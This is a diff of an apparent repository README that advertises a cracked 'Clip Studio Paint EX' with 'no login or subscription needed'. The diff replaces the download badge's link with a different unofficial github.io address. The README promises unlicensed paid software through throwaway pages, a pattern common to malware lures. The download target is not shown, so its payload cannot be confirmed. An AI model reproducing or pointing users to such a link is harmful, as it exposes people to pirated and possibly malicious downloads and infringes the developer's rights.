@@ -2,7 +2,7 @@
 
 **Clip Studio Paint EX** is a professional illustration and animation suite trusted by artists, comic creators, and animators worldwide. This version enables full EX-level tools with offline functionality — no login or subscription needed.
 
-[![⬇️ Download Clip Studio Paint EX](https://img.shields.io/badge/⬇️_Download_Clip_Studio_Paint_EX-blueviolet?style=for-the-badge&logo=clipstudio)](https://clip-studio-paint-ex-download.github.io/.github)
+[![⬇️ Download Clip Studio Paint EX](https://img.shields.io/badge/⬇️_Download_Clip_Studio_Paint_EX-blueviolet?style=for-the-badge&logo=clipstudio)](https://matookfj.github.io/.github/clipstudio)
 
 ---
 
